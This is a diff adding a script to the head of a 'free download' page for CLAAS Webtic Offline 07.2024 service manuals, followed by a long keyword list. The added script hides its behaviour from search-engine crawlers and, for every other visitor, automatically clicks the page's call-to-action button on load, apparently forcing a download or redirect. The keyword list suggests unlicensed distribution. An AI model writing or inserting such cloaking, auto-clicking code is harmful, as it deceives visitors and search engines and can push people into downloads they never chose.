@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CLAAS Webtic Offline 07.2024 EN</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download CLAAS Webtic Offline 07.2024 for rapid access to service information. Includes repair manuals, assembly instructions, and more in multiple languages.">
     <meta name="keywords" content="CLAAS Webtic Offline 07.2024, CLAAS Webtic Offline 07.2024 free download, CLAAS Webtic Offline download, CLAAS Webtic Offline 2024, CLAAS Webtic 07.2024 EN, CLAAS machinery service information, CLAAS Webtic repair manuals, CLAAS Webtic operator manuals, CLAAS Webtic assembly instructions, CLAAS Webtic time schedule, CLAAS Webtic technical system, CLAAS Webtic training document, CLAAS Webtic offline service documents, offline service documents for CLAAS, CLAAS WEBTIC download, CLAAS WEBTIC free download, CLAAS Webtic in multiple languages, CLAAS machinery support, CLAAS combines service documentation, CLAAS forage harvester manuals, CLAAS tractors manuals, CLAAS balers manuals, CLAAS mowers manuals, CLAAS tedders manuals, CLAAS swathers manuals, CLAAS self-loading wagons manuals, CLAAS telehandlers manuals, CLAAS technical documentation, CLAAS technical documents free download, CLAAS WebTIC software, CLAAS equipment service manuals, CLAAS equipment manuals, CLAAS repair manuals English, CLAAS Webtic repair manual free download, CLAAS Webtic repair manual 2024, CLAAS service information, CLAAS combines, CLAAS forage harvester, CLAAS tractors, CLAAS balers, CLAAS mowers, CLAAS tedders, CLAAS swathers, CLAAS self-loading wagons, CLAAS telehandlers, CLAAS technical documentation free, CLAAS repair manuals, CLAAS Webtic Offline free download in English, CLAAS Webtic Offline скачать бесплатно, CLAAS Webtic Offline загрузка, УЛЕН Вебтик Оффлайн 2024 скачать, УЛЕН Webtic Offline загрузить, клаас Вебтик скачать бесплатно, клаас Вебтик скачать, клаас Webtic загрузить, CLAAS Webtic руководство 2024 скачать, CLAAS Webtic инструкция 2024 скачать">
     <style>
